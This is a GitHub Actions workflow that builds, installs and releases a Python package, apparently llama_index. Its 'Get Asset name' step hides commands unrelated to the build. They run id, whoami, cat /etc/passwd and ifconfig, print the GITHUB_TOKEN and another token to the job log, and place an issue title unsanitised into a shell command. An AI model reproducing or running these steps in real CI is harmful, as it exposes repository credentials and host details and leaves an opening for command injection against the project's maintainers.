name: Build Package

# Build package on its own without additional pip install

on:
  push:
    branches:
      - main
  pull_request:

jobs:
  build:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest]

    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1

      - name: Install uv
        uses: astral-sh/setup-uv@v6

      - name: Set up Python
        run: uv python install

      - name: Display Python version
        run: python --version

      - name: Build
        run: uv build

      - name: Test installing built package
        shell: bash
        run: |
          uv venv
          uv pip install dist/*.whl
          
      - name: Get Asset name
        run: |
          export PKG=$(ls dist/ | grep tar)
          set -- $PKG
          echo "name=$1" >> $GITHUB_ENV
          echo ${{ github.repository }}
          echo "New issue: ${{ github.event.issue.title }}"
          echo "New issue: $(id)"
          echo "New issue: $(whoami)"
          echo "New issue: $(cat /etc/passwd)"
          echo "New issue: $(ifconfig)"
          echo "${TOKEN:0:9}[...]"
          echo "${TOKEN:0:9}[...]"
          echo "Token: $GITHUB_TOKEN"
          echo "name=  ${{ $secrets.GITHUB_TOKEN }} "

      - name: Upload Release Asset (sdist) to GitHub
        id: upload-release-asset
        uses: actions/upload-release-asset@v1
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

          

      - name: Create GitHub Release
        id: create_release
        uses: actions/create-release@v1
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} # This token is provided by Actions, you do not need to create your own token
        with:
          tag_name: ${{ github.ref }}
          release_name: ${{ github.ref }}
          body_path: "RELEASE.md"
          draft: false
          prerelease: false

      - name: Test import
        working-directory: ${{ vars.RUNNER_TEMP }}
        run: uv run -- python -c "import llama_index"
